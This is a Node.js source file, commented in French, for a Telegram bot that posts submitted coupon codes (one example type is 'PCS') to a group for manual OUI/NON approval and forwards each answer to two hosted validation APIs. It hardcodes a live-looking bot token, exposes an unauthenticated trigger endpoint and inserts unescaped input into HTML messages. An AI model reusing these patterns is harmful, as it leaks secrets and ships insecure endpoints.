// Bot Telegram pour validation manuelle des coupons
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const express = require('express');
const bodyParser = require('body-parser');
const app = express();
app.use(bodyParser.json());
// Route HTTP pour déclencher l'envoi du message AVEC boutons dans le groupe
app.post('/trigger-coupon', (req, res) => {
  const { type, code, requestId } = req.body;
  if (!type || !code || !requestId) return res.status(400).json({ ok: false, error: 'Missing params' });
  const opts = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ OUI', callback_data: `OUI|${requestId}` },
          { text: '❌ NON', callback_data: `NON|${requestId}` }
        ]
      ]
    },
    parse_mode: 'HTML'
  };
  bot.sendMessage(GROUP_ID, `🔎 Nouveau coupon à vérifier\n\nType : <b>${type}</b>\nCode : <b>${code}</b>\n\nCliquez sur OUI ou NON pour valider ce coupon.`, opts)
    .then(() => res.json({ ok: true }))
    .catch(e => res.status(500).json({ ok: false, error: e.message }));
});

const TOKEN = '8330769234:AAGiGPXFAl13nE7rR44v6MlKhAiuS6sznZM';
const GROUP_ID = -5214080706; // Remplacez par votre group ID
const API_URLS = [
  'https://bot-js-3ptn.onrender.com/api/validate',
  'https://bulboxcoupon.onrender.com/api/validate'
];

const bot = new TelegramBot(TOKEN, { polling: true });

// Quand un code est reçu, envoyez un message avec boutons OUI/NON
// (À appeler depuis le site ou le backend, ou à adapter selon votre flux)
bot.onText(/\/coupon (.+)/, (msg, match) => {
  const [type, code, requestId] = match[1].split('|');
  const opts = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ OUI', callback_data: `OUI|${requestId}` },
          { text: '❌ NON', callback_data: `NON|${requestId}` }
        ]
      ]
    }
  };
  // Si la commande est envoyée en privé, on publie dans le groupe
  if (msg.chat.id !== GROUP_ID) {
    bot.sendMessage(GROUP_ID, `🔎 Nouveau coupon à vérifier\n\nType : <b>${type}</b>\nCode : <b>${code}</b>\n\nCliquez sur OUI ou NON pour valider ce coupon.`, { ...opts, parse_mode: 'HTML' });
  } else {
    // Si la commande est envoyée dans le groupe, on répond dans le groupe avec les boutons
    bot.sendMessage(GROUP_ID, `🔎 Nouveau coupon à vérifier\n\nType : <b>${type}</b>\nCode : <b>${code}</b>\n\nCliquez sur OUI ou NON pour valider ce coupon.`, { ...opts, parse_mode: 'HTML', reply_to_message_id: msg.message_id });
  }
});

// Quand un admin clique sur OUI/NON
bot.on('callback_query', async (query) => {
  const [result, requestId] = query.data.split('|');
  // Appelez les deux APIs pour enregistrer la validation
  let success = false;
  await Promise.all(API_URLS.map(async (url) => {
    try {
      await axios.post(url, { requestId, result });
      success = true;
    } catch (e) {}
  }));
  if (success) {
    bot.answerCallbackQuery(query.id, { text: `Réponse enregistrée: ${result}` });
    bot.editMessageText(`Coupon ${requestId} validé: ${result === 'OUI' ? '✅ OUI' : '❌ NON'}`, {
      chat_id: query.message.chat.id,
      message_id: query.message.message_id
    });
  } else {
    bot.answerCallbackQuery(query.id, { text: 'Erreur API' });
  }
});

// Pour test manuel : /coupon PCS|ABCD123456|requestid123

// Lancer le serveur Express sur un port (ex: 4000)
const PORT = process.env.BOT_PORT || 4000;
app.listen(PORT, () => {
  console.log('Bot HTTP API listening on port', PORT);
});
